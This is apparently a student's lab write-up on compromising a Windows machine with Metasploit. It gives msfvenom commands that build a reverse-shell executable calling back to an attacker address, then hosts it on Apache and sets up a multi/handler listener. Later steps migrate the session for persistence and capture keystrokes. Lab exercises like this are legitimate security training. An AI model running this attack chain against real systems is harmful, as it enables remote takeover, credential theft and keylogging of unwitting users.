# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### NAME: MOHAN RAJ C
### REGISTER NUMBER: 212223040114

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="766" height="337" alt="Screenshot 2025-10-02 120248" src="https://github.com/user-attachments/assets/3876b868-d2d6-4b9b-8ad0-b1877df14fcd" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
<img width="819" height="829" alt="Screenshot 2025-10-02 120613" src="https://github.com/user-attachments/assets/2307025e-c5b5-4cce-acd5-9eb67b8b9968" />


<img width="951" height="828" alt="Screenshot 2025-10-02 120922" src="https://github.com/user-attachments/assets/f1c3326d-8494-48a8-ba14-3c08ef08f091" />


copy the fun.exe into the apache ```/var/www/html ```folder
Start apache server ```sudo systemctl apache2 start``` 
Check the status of apache2 ```sudo apache2 status```

Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
<img width="950" height="635" alt="Screenshot 2025-10-02 121005" src="https://github.com/user-attachments/assets/5c971085-8fa8-4c8c-9669-b0e0f9196e55" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.



Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="953" height="876" alt="Screenshot 2025-10-02 121036" src="https://github.com/user-attachments/assets/5cce2af3-af3c-4e52-8af8-90136fb98d1b" />



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far

<img width="923" height="327" alt="Screenshot 2025-10-02 121356" src="https://github.com/user-attachments/assets/aff10098-76be-4e61-aa70-61ef17d339e7" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

